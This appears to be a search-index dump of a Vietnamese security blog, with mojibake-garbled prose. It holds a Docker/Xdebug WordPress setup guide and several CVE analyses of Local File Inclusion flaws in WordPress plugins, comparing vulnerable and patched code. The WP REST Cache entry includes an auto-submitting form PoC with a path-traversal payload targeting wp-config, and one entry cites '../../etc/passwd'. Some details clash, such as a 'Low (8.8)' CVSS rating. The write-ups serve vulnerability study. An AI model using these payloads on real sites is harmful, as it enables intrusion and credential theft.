ph·ª©c t·∫°p. V·ªõi Docker Compose, t·∫•t c·∫£ n·∫±m trong m·ªôt file YAML gi√∫p: D·ªÖ c√†i ƒë·∫∑t: docker-compose up -d l√† c√≥ ƒë·ªß WordPress + MySQL. D·ªÖ chia s·∫ª: Ng∆∞·ªùi kh√°c ch·ªâ c·∫ßn c√πng file docker-compose.yml l√† ch·∫°y ƒë∆∞·ª£c. D·ªÖ m·ªü r·ªông: Th√™m phpMyAdmin, Nginx, ho·∫∑c Xdebug ch·ªâ c·∫ßn v√†i d√≤ng. Xem h∆∞·ªõng d·∫´n c√†i Docker Compose t·∫°i: https://docs.docker.com/compose/install/ Installing WordPress with Docker Compose and Xdebug Ph·∫ßn n√†y h∆∞·ªõng d·∫´n c√†i WordPress v·ªõi Docker Compose, t√≠ch h·ª£p Xdebug ƒë·ªÉ debug tr·ª±c ti·∫øp trong VS Code. C√°ch n√†y gi√∫p b·∫°n c√≥ m√¥i tr∆∞·ªùng ph√°t tri·ªÉn ƒë·∫ßy ƒë·ªß, d·ªÖ g·ª° l·ªói v√† m·ªü r·ªông. C·∫•u tr√∫c th∆∞ m·ª•c: . ‚îú‚îÄ‚îÄ wordpress ‚îú‚îÄ‚îÄ docker-compose.yml ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ php.ini ‚îî‚îÄ‚îÄ .vscode ‚îî‚îÄ‚îÄ launch.json Setup Environment T·∫°o th∆∞ m·ª•c m·ªõi ƒë·ªÉ ch·ª©a to√†n b·ªô c·∫•u h√¨nh: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker Create Dockerfile Image WordPress m·∫∑c ƒë·ªãnh ch∆∞a c√≥ Xdebug, n√™n ta m·ªü r·ªông b·∫±ng Dockerfile. nano Dockerfile N·ªôi dung: FROM wordpress:latest # C√†i ƒë·∫∑t Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug Create docker-compose.yml T·∫°o file ƒë·ªÉ c·∫•u h√¨nh to√†n b·ªô h·ªá th·ªëng: nano docker-compose.yml N·ªôi dung: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Th√¥ng tin volumes: d√πng ƒë·ªÉ l∆∞u tr·ªØ d·ªØ li·ªáu v√† ƒë·ªìng b·ªô m√£ ngu·ªìn gi·ªØa m√°y th·∫≠t v√† container. Gi·∫£i th√≠ch: db_data:/var/lib/mysql L∆∞u d·ªØ li·ªáu MySQL b·ªÅn v·ªØng, kh√¥ng m·∫•t khi x√≥a container. ./wordpress:/var/www/html ƒê·ªìng b·ªô m√£ ngu·ªìn WordPress gi·ªØa m√°y v√† container, gi√∫p s·ª≠a code tr·ª±c ti·∫øp. ./php.ini:/usr/local/etc/php/conf.d/php.ini G·∫Øn file c·∫•u h√¨nh PHP/Xdebug, d·ªÖ t√πy ch·ªânh m√† kh√¥ng c·∫ßn rebuild image. Create php.ini K√≠ch ho·∫°t Xdebug v√† c·∫•u h√¨nh PHP. nano php.ini N·ªôi dung: zend_extension=xdebug xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=172.17.0.1 xdebug.client_port=9003 xdebug.log_level=0 upload_max_file","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin MasterStudy LMS phi√™n b·∫£n ‚â§ 3.5.28 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) v√† 3.5.29 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } Trong phi√™n b·∫£n l·ªói, callback c·ªßa shortcode stm_lms_courses_categories l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã style t·ª´ m·∫£ng $atts v√† truy·ªÅn th·∫≥ng v√†o STM_LMS_Templates::stm_lms_load_vc_element() m√† kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra hay l√†m s·∫°ch ƒë·∫ßu v√†o n√†o =\u003e LFI c√≥ th·ªÉ x·∫£y ra. B·∫£n v√°: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } B·∫£n v√° ƒë√£ sanitize $atts['style'] b·∫±ng sanitize_file_name() ƒë√£ lo·∫°i b·ªè chu·ªói/k√Ω t·ª± kh√¥ng an to√†n =\u003e ngƒÉn ch·∫∑n LFI. Vulnerable Code public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } H√†m include() t·∫°i ƒë√¢y d√πng bi·∫øn $element do stm_lms_locate_vc_element() tr·∫£ v·ªÅ v√† $__template_name (t·ª©c gi√° tr·ªã style t·ª´ shortcode) ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp t·ªõi k·∫øt qu·∫£ ƒë√≥. N·∫øu style kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c, attacker c√≥ th·ªÉ √©p include file t√πy √Ω d·∫´n ƒë·∫øn LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template = $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } H√†m stm_lms_locate_vc_element() c√≥ nhi·ªám v·ª• x√°c ƒë·ªãnh v√† tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n file template (.php) N·∫øu c√≥ $template_name, n√≥ s·∫Ω ghi ƒë√® t√™n template m·∫∑c ƒë·ªãnh v√† ƒë·∫£m b·∫£o t√™n file c√≥ ph·∫ßn m·ªü r·ªông .php. T√™n file s·∫Ω l√†STM_LMS_PATH/includes/shortcodes/partia","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin WP REST Cache phi√™n b·∫£n ‚â§ 2025.1.0 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) v√† 2025.1.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } Trong phi√™n b·∫£n l·ªói, $sub l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa filter_input() l·∫•y gi√° tr·ªã t·ª´ tham s·ªë GET (?sub=...) trong URL v·ªõi filter FILTER_SANITIZE_FULL_SPECIAL_CHARS d√πng ƒë·ªÉ esacape \"\u003c\u003e\u0026 v√† c√°c k√Ω t·ª± v·ªõi ASCII value d∆∞·ªõi 32. T·ª©c kh√¥ng bao g·ªìm .(46) v√† /(47) $sub ƒë∆∞·ª£c concat v√†o chu·ªói c√≥ '.php' sau c√πng tr∆∞·ªõc khi ƒë∆∞·ª£c include_once m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá tr∆∞·ªõc LFI. B·∫£n v√°: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } B·∫£n v√° ƒë√£ th√™m c∆° ch·∫ø ki·ªÉm tra v·ªã tr√≠ file tr∆∞·ªõc khi include, ƒë·∫£m b·∫£o file ƒë∆∞·ª£c n·∫°p ch·ªâ n·∫±m trong th∆∞ m·ª•c partials. N·∫øu ph√°t hi·ªán ƒë∆∞·ªùng d·∫´n ra ngo√†i (do chu·ªói nh∆∞ ../), plugin t·ª± ƒë·ªông chuy·ªÉn v·ªÅ file m·∫∑c ƒë·ªãnh an to√†n. Nh·ªù ƒë√≥, l·ªó h·ªïng LFI b·ªã lo·∫°i b·ªè. Vulnerable Code settings_page() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback c·ªßa submenu add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); T·ª©c khi truy c·∫≠p endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 th√¨ settings_page() ƒë∆∞·ª£c g·ªçi. Exploit Proof of Concept (PoC) Step 1 T·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2 G·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn C·∫£nh b√°o L·ªó h·ªïng n√†y ch·ªâ khai th√°c ƒë∆∞·ª£c tr√™n Windows, v√¨ h√†m file_exists() x·ª≠ l√Ω ƒë∆∞·ªùng d·∫´n kh√°c nhau gi·ªØa hai h·ªá ƒëi·ªÅu h√†nh. Tr√™n Linux, n·∫øu ƒë∆∞·ªùng d·∫´n ch·ª©a th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i, h√†m s·∫Ω tr·∫£ v·ªÅ fal","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin LatePoint phi√™n b·∫£n ‚â§ 5.1.93 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) v√† 5.1.94 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } Trong phi√™n b·∫£n l·ªói, h√†m render() g·∫Øn .php v√†o $layout v√† include tr·ª±c ti·∫øp m√† kh√¥ng ki·ªÉm tra, d·∫´n ƒë·∫øn Local File Inclusion (LFI) n·∫øu $layout b·ªã ki·ªÉm so√°t t·ª´ ƒë·∫ßu v√†o. B·∫£n v√°: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } B·∫£n v√° ƒë√£ th√™m get_safe_layout_path() ƒë·ªÉ lo·∫°i b·ªè /, \\, . v√† null byte; ch·ªâ cho ph√©p [A-Za-z0-9_-]; x√¢y d·ª±ng ƒë∆∞·ªùng d·∫´n, d√πng realpath() v√† so s√°nh v·ªõi LATEPOINT_VIEWS_LAYOUTS_ABSPATH. N·∫øu h·ª£p l·ªá m·ªõi include, ngƒÉn ch·∫∑n LFI. Vulnerable Code H√†m render() ƒë∆∞·ª£c g·ªçi t·∫°i 12 v·ªã tr√≠ kh√°c nhau, n√™n vi·ªác trace th·ªß c√¥ng s·∫Ω r·∫•t m·∫•t th·ªùi gian. 12 v·ªã tr√≠ g·ªçi h√†m render() ƒê·ªÉ t·ªëi ∆∞u, ta s·ª≠ d·ª•ng debugger: ƒê·∫∑t breakpoint trong h√†m render(). Th·ª±c hi·ªán l·∫ßn l∆∞·ª£t c√°c thao t√°c trong giao di·ªán (UI). M·ªói khi render() ƒë∆∞·ª£c g·ªçi, ch∆∞∆°ng tr√¨nh s·∫Ω t·∫°m d·ª´ng t·∫°i breakpoint v√† highlight d√≤ng code t∆∞∆°ng ·ª©ng, gi√∫p x√°c ƒë·ªãnh nhanh lu·ªìng g·ªçi h√†m. Video debugger nh·∫£y ƒë·∫øn break point üëâ Khi truy c·∫≠p endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view v·ªõi route name l√† c√°c submenu c·ªßa plugin th√¨ render() ƒë∆∞·ª£c g·ªçi v·ªõi layout m·∫∑c ƒë·ªãnh l√† admin Layout m·∫∑c ƒë·ªãnh Quan s√°t callstack, ta th·∫•y ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m ƒë·∫øn render() Lu·ªìng g·ªçi h√†m trong callstack function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html = ''; if($this-\u003eget_return_format() == 'json'){ if(is_array($view_name)) $view_name = $view_name","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Hide My WP Ghost phi√™n b·∫£n ‚â§ 5.4.01 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) v√† 5.4.02 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } H√†m getOriginalUrl() d√πng ƒë·ªÉ ph√¢n t√≠ch v√† t√°i t·∫°o l·∫°i URL g·ªëc d·ª±a tr√™n c√°c quy t·∫Øc rewrite trong h·ªá th·ªëng. Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã $new_url kh√¥ng ƒë∆∞·ª£c l√†m s·∫°ch tr∆∞·ªõc khi tr·∫£ v·ªÅ, cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n ƒë∆∞·ªùng d·∫´n ƒë·ªôc h·∫°i nh∆∞ ../../etc/passwd d·∫´n ƒë·∫øn nguy c∆° LFI. B·∫£n v√°: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! em","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin License For Envato phi√™n b·∫£n ‚â§ 1.0.0 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) v√† 1.1.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; 